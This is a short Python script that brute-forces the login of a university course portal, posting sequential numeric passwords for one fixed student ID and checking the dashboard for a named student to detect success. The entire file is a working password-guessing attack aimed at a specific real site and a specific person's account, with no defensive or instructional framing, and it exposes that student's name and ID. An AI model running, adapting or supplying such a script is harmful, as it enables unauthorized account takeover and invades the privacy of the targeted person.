import requests
from bs4 import BeautifulSoup

url = 'http://courses.christuniversity.in/login/index.php'
url2 = 'http://courses.christuniversity.in/my/'
usrname = 1417182
count = 10545974
passw = 0
session = requests.session()

while count<=10590000:
    payload = {'username': usrname, 'password': count}
    r = session.post(url, data=payload)
    rs = session.get(url2)
    soup = BeautifulSoup(rs.content,'html.parser')
    for link in soup.find_all('h1'):
        if(link.text == "ROHIT KUMAR 1417182"):
            passw = count
            print "Pass",passw
            exit()
        else:
            count+=1
            print count
            break
